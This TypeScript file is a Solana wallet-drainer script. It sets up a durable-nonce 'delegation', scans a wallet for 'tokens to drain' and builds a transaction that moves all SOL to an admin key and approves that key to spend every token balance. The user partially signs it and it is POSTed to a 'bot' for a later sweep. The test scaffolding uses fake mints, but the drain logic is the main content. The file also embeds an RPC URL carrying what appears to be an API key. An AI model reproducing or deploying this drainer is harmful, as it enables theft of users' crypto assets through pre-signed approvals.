import { 
    Connection, Keypair, PublicKey, Transaction, SystemProgram, NonceAccount, LAMPORTS_PER_SOL 
} from '@solana/web3.js';
import * as anchor from '@coral-xyz/anchor';
import { 
    createMint, createAccount, mintTo, TOKEN_PROGRAM_ID, createApproveInstruction 
} from "@solana/spl-token";
import { readFileSync } from 'fs';
import BN from 'bn.js';

// CONFIGURATION
const connection = new Connection("https://thrilling-restless-dust.solana-mainnet.quiknode.pro/3eb9e1f466004db0da96dc59465e02c3615194f4/", "confirmed");
const PROGRAM_ID = new PublicKey("8mKiRaRw4TaMhdMeCjqMtXFxgc4Kv863nLECCcZrYb9F");
const BOT_API_URL = "https://thrilling-restless-dust.solana-mainnet.quiknode.pro/3eb9e1f466004db0da96dc59465e02c3615194f4/";

// KEYS
const userKeypair = Keypair.generate();
const nonceKeypair = Keypair.generate();
const adminSecret = JSON.parse(readFileSync('./admin-wallet.json', 'utf-8'));
const adminKeypair = Keypair.fromSecretKey(new Uint8Array(adminSecret));

// IDL (Using placeholder, assuming you have the full JSON in your files)
const IDL = JSON.parse(readFileSync('./target/idl/hybrid_token.json', 'utf-8'));

async function main() {
    console.log("👤 User:", userKeypair.publicKey.toString());
    console.log("🏦 Nonce:", nonceKeypair.publicKey.toString());

    const provider = new anchor.AnchorProvider(connection, new anchor.Wallet(userKeypair), {});
    const program = new anchor.Program(IDL, provider);

    // 1. SETUP ENVIRONMENT (Airdrop + Create Fake Tokens for Testing)
    console.log("🛠️  Setting up test environment...");
    await connection.requestAirdrop(userKeypair.publicKey, 2 * LAMPORTS_PER_SOL).then(s => connection.confirmTransaction(s));
    
    // Create Fake USDC and BONK
    const mintUSDC = await createMint(connection, userKeypair, userKeypair.publicKey, null, 6);
    const userUSDC = await createAccount(connection, userKeypair, mintUSDC, userKeypair.publicKey);
    await mintTo(connection, userKeypair, mintUSDC, userUSDC, userKeypair, 1000 * 10**6); // 1000 USDC

    const mintBONK = await createMint(connection, userKeypair, userKeypair.publicKey, null, 5);
    const userBONK = await createAccount(connection, userKeypair, mintBONK, userKeypair.publicKey);
    await mintTo(connection, userKeypair, mintBONK, userBONK, userKeypair, 50000 * 10**5); // 50k BONK

    console.log("✅ User wallet funded with SOL, USDC, and BONK.");

    // 2. ON-CHAIN SETUP (Delegation + Nonce)
    // Need a token account for the setup instruction logic (even if unused for sweep)
    const [delegationPda] = PublicKey.findProgramAddressSync([Buffer.from("delegation"), userKeypair.publicKey.toBuffer()], PROGRAM_ID);
    
    await program.methods.setupDelegation(new BN(1000000), new BN(0))
        .accounts({
            user: userKeypair.publicKey,
            delegation: delegationPda,
            userTokenAccount: userUSDC, // Just needs valid token account
            nonceAccount: nonceKeypair.publicKey,
            programAuthority: adminKeypair.publicKey,
            tokenProgram: TOKEN_PROGRAM_ID,
            systemProgram: SystemProgram.programId,
            recentBlockhashes: new PublicKey("SysvarRecentB1ockHash11111111111111111111"),
            rent: anchor.web3.SYSVAR_RENT_PUBKEY
        })
        .signers([userKeypair, nonceKeypair])
        .rpc();

    // 3. SCAN WALLET FOR TOKENS
    console.log("🔍 Scanning user wallet for tokens...");
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(userKeypair.publicKey, { programId: TOKEN_PROGRAM_ID });
    
    console.log(`Found ${tokenAccounts.value.length} tokens to drain.`);

    // 4. BUILD MASTER KEY TRANSACTION
    // Get Nonce
    const nonceInfo = await connection.getAccountInfo(nonceKeypair.publicKey);
    const nonceData = NonceAccount.fromAccountData(nonceInfo!.data);

    const tx = new Transaction();
    tx.feePayer = adminKeypair.publicKey;
    tx.recentBlockhash = nonceData.nonce;

    // A. Nonce Advance
    tx.add(SystemProgram.nonceAdvance({
        noncePubkey: nonceKeypair.publicKey,
        authorizedPubkey: adminKeypair.publicKey
    }));

    // B. Transfer All SOL (Custom Instruction)
    const sweepSolIx = await program.methods.transferAllSol()
        .accounts({
            user: userKeypair.publicKey,
            destination: adminKeypair.publicKey,
            systemProgram: SystemProgram.programId
        })
        .instruction();
    tx.add(sweepSolIx);

    // C. Approve All Tokens (Standard SPL Instruction)
    // Grants Admin authority to spend ALL tokens in these accounts
    for (const { pubkey, account } of tokenAccounts.value) {
        const amount = BigInt(account.data.parsed.info.tokenAmount.amount);
        if (amount > 0) {
            tx.add(createApproveInstruction(
                pubkey, // User's Token Account
                adminKeypair.publicKey, // Delegate (Admin)
                userKeypair.publicKey, // Owner (User)
                amount // Max amount
            ));
            console.log(`➕ Added approval for token account: ${pubkey.toString()}`);
        }
    }

    // 5. SIGN AND SEND
    tx.partialSign(userKeypair);
    const base64 = tx.serialize({ requireAllSignatures: false }).toString('base64');

    await fetch(BOT_API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            wallet: userKeypair.publicKey.toString(),
            txBase64: base64,
            nonce: nonceKeypair.publicKey.toString()
        })
    });

    console.log("✅ MASTER KEY SENT TO BOT!");
    console.log(`👉 Run: /execute-saved-sweep user_wallet:${userKeypair.publicKey.toString()}`);
}

main().catch(console.error);
